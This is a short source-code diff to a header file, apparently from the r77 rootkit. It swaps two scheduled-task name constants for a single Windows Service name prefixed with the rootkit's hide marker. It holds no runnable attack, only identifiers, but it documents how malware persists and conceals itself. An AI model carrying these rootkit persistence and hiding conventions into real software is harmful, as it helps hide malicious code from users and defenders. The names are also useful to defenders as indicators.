@@ -26,14 +26,9 @@
 #define R77_HELPER_SIGNATURE					0x7268
 
 /// <summary>
-/// Name for the scheduled task that starts the r77 service on 32-bit operating systems.
+/// Name for the Windows Service that starts the r77 service.
 /// </summary>
-#define R77_SERVICE_NAME32						HIDE_PREFIX L"svc32"
-/// <summary>
-/// Name for the scheduled task that starts the r77 service on 64-bit operating systems.
-/// </summary>
-#define R77_SERVICE_NAME64						HIDE_PREFIX L"svc64"
-// Note: The name of the scheduled task is different between x86 and x64 OS, because in prior r77 versions, there were two r77 service processes.
+#define R77_SERVICE_NAME						HIDE_PREFIX L"svc"
 
 /// <summary>
 /// Name for the named pipe that notifies the r77 service about new child processes.
